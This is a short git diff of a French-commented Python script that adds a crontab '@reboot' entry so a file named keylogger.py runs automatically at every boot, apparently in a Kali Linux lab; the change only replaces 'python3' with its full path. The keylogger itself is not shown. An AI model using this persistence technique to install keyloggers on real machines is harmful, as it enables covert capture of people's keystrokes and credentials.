@@ -17,7 +17,7 @@ import subprocess
 python_script = "/home/kali/Downloads/keylogger.py"
 
 # Commande crontab pour exécuter le script Python au démarrage
-cron_job = f"@reboot python3 {python_script}"
+cron_job = f"@reboot /usr/bin/python3 {python_script}"
 
 # Obtenir la crontab actuelle de l'utilisateur
 current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
